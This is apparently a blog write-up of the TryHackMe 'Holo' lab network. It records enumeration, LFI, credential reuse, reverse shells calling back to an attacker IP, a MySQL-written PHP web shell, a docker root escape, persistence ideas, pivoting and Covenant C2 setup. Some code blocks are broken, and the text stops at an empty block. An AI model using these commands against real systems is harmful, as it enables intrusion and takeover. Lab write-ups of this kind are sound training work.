8. Situational Awareness
9. Active Directory attacks

# .NET Basic

.NET is a software framework developed by Microsoft for building and running applications on various platforms.
.NET uses a run-time environment known as the Common Language Runtime (CLR).We can use any .NET language (C#, PowerShell, etc.) to compile into the Common Intermediary Language (CIL). NET also interfaces directly with Win32 and API calls making the optimal solution for Windows application development and offensive tool development.

----   
.NET consists of two different branches with different purposes, outlined below.

- .NET Framework (Windows only)
- .NET Core (Cross-Compatible)

The main component of .NET is .NET assemblies. .NET assemblies are compiled .exes and .dlls that any .NET language can execute.The CLR will compile the CIL into native machine code. You can find the flow of code within .NET below.

## machine `10.200.107.33`

on port 80, the was a website running 

![Alt text](/assets/img/tryhackme/Networks/Holo/h3.png) 

scanning for hidden directories with the command 
`gobuster dir -u http://10.200.107.33/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  -o gobuster.out `
, I found nothing but the website seemed to be running with wordpress 
```bash
/login                (Status: 302) [Size: 0] [--> http://www.holo.live/wp-login.php]
/0                    (Status: 301) [Size: 0] [--> http://10.200.107.33/0/]

Scanning for WordPress, I found 2 things , version number and username but the login was empty page

-  wordpress version number

```bash

# Web App Exploitation
After scanning for hidden directories and all, I found nothing. Now, it's time to check for vhosts. Vhosts allow running many websites on one server. They need an extra header, Host, to tell the Web Server which vhost the traffic is for. This is handy when you have only one IP address but want multiple DNS entries. Services like Squarespace or WordPress often use this.

With te command 
`wfuzz -u http://holo.live -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.holo.live" --hw 1402`

I found some hidden virtual hosts
```nmap
Target: http://holo.live/
Total requests: 4990

=====================================================================
ID           Response   Lines    Word       Chars       Payload

Total time: 0
Processed Requests: 4990
Filtered Requests: 4984

```

and with `dev` and `www`, we had static webpages but with `admin` , there was a log in

![Alt text](/assets/img/tryhackme/Networks/Holo/h4.png) 


While fuzzing for hidden directories on `admin.holo.live`,came across the `robots.txt` file.

```nmap
User-agent: *
Disallow: /var/www/admin/db.php
Disallow: /var/www/admin/dashboard.php
Disallow: /var/www/admin/supersecretdir/creds.txt

```

In `dev.holo.live` when checking the images, it seemed to have lfi when fetching the images.From OWASP, "Local file inclusion (also known as LFI) is the process of including files, that are already locally present on the server, through the exploiting of vulnerable inclusion procedures implemented in the application." LFI can be trivial to identify, typically found from parameters, commonly used when downloading files or referencing images. Find an example below from the test environment.

![Alt text](/assets/img/tryhackme/Networks/Holo/h5.png) 

Intercepted the traffic with burp and I was able to read `/etc/passwd` file 

![Alt text](/assets/img/tryhackme/Networks/Holo/h6.png) 
I tried to access home folder but it was in vain so I `wfuzz` for files that I could access but I didn't find anything intresting

```bash
wfuzz -c -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://dev.holo.live/img.php?file=FUZZ
```

However remember while exploring the `robots.txt` directory on a`dmin.holo.live`, I stumbled upon hidden files, notably one that appeared to contain credentials located at `/var/www/admin/supersecretdir/creds.txt`.

![Alt text](/assets/img/tryhackme/Networks/Holo/h7.png) 

- username `admin`
- password `DBManagerLogin!`

and I was logged in 

![Alt text](/assets/img/tryhackme/Networks/Holo/h8.png) 

Looking at the webpage source code , there was this comment line 

```php
 //if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']);} -->
```

Trying with the `?cmd=ifconfig`, I was the ip address of the server, so we had a command executed

![Alt text](/assets/img/tryhackme/Networks/Holo/h9.png) 

With the command `nc -c bash 10.50.103.242 4444`, I was able to get a reverse shell back

# Docker


Containers, due to their isolated nature, will often have very few processes running in comparison to something such as a virtual machine. We can simply use ps aux to print the running processes. Note in the screenshot below that there are very few processes running?

![Alt text](/assets/img/tryhackme/Networks/Holo/h11.png) 

Containers allow environment variables to be provided from the host operating system by the use of a .dockerenv file. This file is located in the "/" directory and would exist on a container - even if no environment variables were provided.

![Alt text](/assets/img/tryhackme/Networks/Holo/h12.png) 


Cgroups are used by containerization software such as LXC or Docker. Let's look for them by navigating to /proc/1 and then catting the "cgroup" file... It is worth mentioning that the "cgroups" file contains paths including the word "docker".

![Alt text](/assets/img/tryhackme/Networks/Holo/h13.png) 

## Living off the LANd

Since we know that we are in a docker container, we can continue to enumeration to determine what we can do and what other paths we can take to continue attacking this server. A critical part of situational awareness is identifying network and host information. This can be done via port scanning and network tooling.

1st we can utilize /dev/tcp/ipaddr/port; this will act as a built-in scanner to gather information on the container ports. This utility is broken down below. more info [Linux Documentation Project.](https://tldp.org/LDP/abs/html/)devref1.html
- `/dev/ `contains all hardware devices, such as NIC, HDD, SSD, RAM
- `/dev/tcp/` pseudo-device of your ethernet/wireless card opens a socket when data is directed either in or out.

We can also use this to our advantage to scan internal ports by piping a list of ports into it. Find an example of a full bash port scanner below.

```bash
#!/bin/bash
ports=(21 22 53 80 443 3306 8443 8080)
for port in ${ports[@]}; do
timeout 1 bash -c "echo \"Port Scan Test\" > /dev/tcp/1.1.1.1/$port && echo $port is open || /dev/null" 
done
```

2nd we can use method of port scanning using python. To scan ports with python, we will need to use the sockets library to open connections and enable network connectivity. The script itself is as simple as opening connections to sequencing ports in a loop. Find an example of the full python port scanner below.

```python
#!/usr/bin/python3
import socket
host = "1.1.1.1"
portList = [21,22,53,80,443,3306,8443,8080]
for port in portList:
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 try:
  s.connect((host,port))
  print("Port ", port, " is open")
 except:
  print("Port ", port, " is closed")
```

3rd we can use Netcat to connect to a range of ports `nc -zv 192.168.100.1 1-65535`

```nmap
www-data@a7cac6cdbc37:/var/www/admin$ nc -zv 192.168.100.1 1-65535
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 33060 (?) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 8080 (http-alt) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 3306 (mysql) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 80 (http) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 22 (ssh) open
```

But checking for open ports using netstat,we see only open ports within the docker environment

```nmap
www-data@a7cac6cdbc37:/var/www/admin$ netstat -ona 
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer

www-data@a7cac6cdbc37:/var/www/admin$ 

```

Now that we know mysq is running, we neet to search for mysql credentials most likely found in `/var/www/`

```mysql
www-data@a7cac6cdbc37:/var/www/admin$ cat db_connect.php
<?php

define('DB_SRV', '192.168.100.1');
define('DB_PASSWD', "!123SecureAdminDashboard321!");
define('DB_USER', 'admin');
define('DB_NAME', 'DashboardDB');

$connection = mysqli_connect(DB_SRV, DB_USER, DB_PASSWD, DB_NAME);

if($connection == false){

        die("Error: Connection to Database could not be made." . mysqli_connect_error());
}
?>
```

- username : admin
- password : !123SecureAdminDashboard321!
- host : 192.168.100.1


The basic methodology for exploiting MySQL can be found below.

- Access the remote database using administrator credentials
- Create a new table in the main database
- Inject PHP code to gain command execution
- Example code: <?php $cmd=$_GET["cmd"];system($cmd);?>
- Drop table contents onto a file the user can access
- Execute and obtain RCE on the host.


use single command to inject our PHP code into a table and save the table into a file on the remote system. We are writing any code that we want onto the remote system from this command, which we can then execute, giving use code execution. Find the command used below.

`select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';`
![Alt text](/assets/img/tryhackme/Networks/Holo/h14.png) 

```nmap
fig-data@a7cac6cdbc37:/var/www/html$ curl 192.168.100.1:8080/shell.php?cmd=whoami
www-data
www-data@a7cac6cdbc37:/var/www/html$ 
```

and we have command execution here, so is to have a reverse connection back to us and we had a call back

`curl 192.168.100.1:8080/shell.php?cmd=bash+-c+"bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.50.103.242%2F4488%200%3E%261"`

![Alt text](/assets/img/tryhackme/Networks/Holo/h15.png) 

## Privilege Escalation

searching for files with this bit set with the command `find / -perm -u=s -type f 2>/dev/null`
I found

```nmap
www-data@ip-10-200-107-33:/var/www/html$ find / -perm -u=s -type f 2>/dev/null
/usr/lib/eject/dmcrypt-get-device
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/bin/umount
/usr/bin/docker
/usr/bin/fusermount
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/su
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/at
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/mount
/usr/bin/chsh
www-data@ip-10-200-107-33:/var/www/html$ 
```

Docker stands out here.

While browsing through [gtfobins](https://gtfobins.github.io/gtfobins/docker/), I discovered a method to exploit to root using the following command:

`docker run -v /:/mnt --rm -it cb1b741122e8 chroot /mnt sh`

The command mount the file system into the docker container under `/mnt`

![Alt text](/assets/img/tryhackme/Networks/Holo/h16.png) 

## Post Exploitation

Yes, we do have the entire file system in the container but we needed more functionality like to execute commands as root in the machine

There are many methods for persistence 
1. Create a ssh_key and drop it on the root file
2. Change the root password hash on /etc/shadows
3. Backdoored binaries
4. PAM backdoor
6. Malicious services
7. Cronjob
8. Credential harvesting

I used 2 mtds ,
1. Created and droped a ssh key on the `/root/.ssh`
2. cracked the passwords for the users account

# Pivoting Digging a tunnel to nowhere

There are several tools outlined below that can help us in pivoting.
1. sshuttle
2. Chisel
3. Ligolo
4. Metasploit autoroute


To create a SOCKs server with Chisel, you will only need two commands ran on the target and the attacking machine, outlined below.

- On the attacking machine: `./chisel server -p 8000 --reverse`
- On the target machine: `./chisel client <SERVER IP>:8000 R:socks`

Using sshuttle is relatively easy and only requires one command. For sshuttle to work, you only need to specify one parameter, -r . With this parameter, you will specify the user and target like you would for a standard ssh connection. You will also need to specify the CIDR range of the network; this does not require a parameter. Find an example of syntax below.

Syntax: `sshuttle -r ubuntu@10.200.107.33 10.200.107.0/24`

sudo docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /opt/c2/Covenant/Covenant/Data:/app/Data covenant


# Command and Control 
## Command your Foes and Control your Friends

To use covenant, you have to install dotnet framework  using the following [documentation](https://aka.ms/dotnet-core-applaunch?framework=Microsoft.AspNetCore.App&framework_version=3.1.0&arch=arm64&rid=linux-arm64&os=kali.2023.2)

but with me it didn't work, so I had to use docker instead

```bash
git clone --recurse-submodules https://github.com/cobbr/Covenant
cd Covenant/Covenant
docker build -t covenant .
docker run -it -p 7443:7443 -p 80:80 -p 443:443 --name covenant -v /opt/Covenant/Covenant/Data:/app/Data covenant
```

![Alt text](/assets/img/tryhackme/Networks/Holo/h17.png) 

Create an account and login

![Alt text](/assets/img/tryhackme/Networks/Holo/h18.png) 

When operating with Covenant, there are four main stages: creating a listener, generating a stager, deploying a grunt, utilizing the grunt. All stages of operation can already be done using other tools like MSFVenom, Netcat, Metasploit, etc. however, Covenant gives you a way to operationalize them all under one platform allowing for easier management and collaborative operations.


# Web App Exploitation
exploiting ip address `10.200.107.31`
When doing a ping `for i in {1..255}; do (ping -c 1 10.200.107.${i} | grep "bytes from" &); done`, it 
reveals additional IP addresses available within the local network, providing insights into the network topology.

![Alt text](/assets/img/tryhackme/Networks/Holo/h20.png) 

Whn doing a nmap scan on the ip address `10.200.107.31`, we can see port 80 open 

```nmap
Nmap scan report for ip-10-200-107-31.eu-west-1.compute.internal (10.200.107.31)

MAC Address: 02:EF:3D:AB:DB:D3 (Unknown)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

```

To access the network, we have to port tunnel with the command `sshuttle -r sire@10.200.107.33 0.0.0.0/0 `

![Alt text](/assets/img/tryhackme/Networks/Holo/h21.png) 

Try to reset the password with user `sire`, we can see the username does not exist

![Alt text](/assets/img/tryhackme/Networks/Holo/h22.png) 

This means that there is some user validation on the server so tying user `gurag` we can see user exists and with a cookie token generated

![Alt text](/assets/img/tryhackme/Networks/Holo/h23.png)

Intercepting the traffic , we can see that there is a place to supply some user token cookie in url 

![Alt text](/assets/img/tryhackme/Networks/Holo/h24.png)

When you supply the user token in the url , you will be directed to `/reset` where you will be able to reset the password

![Alt text](/assets/img/tryhackme/Networks/Holo/h25.png)

After successfully updating the password, we gained access to a server featuring an image uploading capability, accessible via the `/img` directory. This functionality allows users to upload images and subsequently view them within the server.

![Alt text](/assets/img/tryhackme/Networks/Holo/h26.png)

## Exploiting the uploads fucntionally

After attempting to upload a basic PHP shell `<?php system($_GET['lfi']); ?>`, it was swiftly removed without executing commands. Consequently, I opted to upload a web shell instead, in pursuit of achieving the desired functionality.

```php
